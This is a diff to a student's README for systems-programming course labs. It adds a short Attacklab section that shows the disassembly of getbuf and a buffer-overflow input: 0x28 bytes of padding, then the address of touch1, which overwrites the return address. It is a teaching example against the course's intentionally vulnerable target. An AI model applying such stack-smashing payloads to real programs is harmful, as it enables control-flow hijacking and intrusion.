@@ -57,9 +57,36 @@ A random bomb is generated to test, see [bomblab-real(中文)](bomblab/bomblab-r
 
 ### Attacklab
 
-To modify the behavior of the targets by developing exploits based on either code injection or return-oriented programming.
+To modify the behavior of the targets by developing exploits based on either **code injection** or **return-oriented programming**.
 
-TODO here
+Here we can understand instructions better, and the memory of stack. For example:
+
+```c++
+004017a8 <getbuf>:
+  4017a8:  48 83 ec 28            sub    $0x28,%rsp
+  4017ac:  48 89 e7               mov    %rsp,%rdi
+  4017af:  e8 8c 02 00 00         callq  401a40 <Gets>
+  4017b4:  b8 01 00 00 00         mov    $0x1,%eax
+  4017b9:  48 83 c4 28            add    $0x28,%rsp
+  4017bd:  c3                     retq   
+```
+
+By making input string like
+
+```c++
+00 00 00 00 00 00 00 00    // 64 bit, 8 bytes
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00    // 0x28 bytes
+c0 17 40 00                // use `touch1` to cover the return address
+```
+
+we can make the program `jump` to another place we want.
+
+Done in 2023/1, see [attacklab-practice](attacklab/attacklab-practice.md) for more details.
+
+A random attack-lab is generated to test, see [attacklab-real(中文)](attacklab/attacklab-real.md) for more details.
 
 ### The rest of lab
 
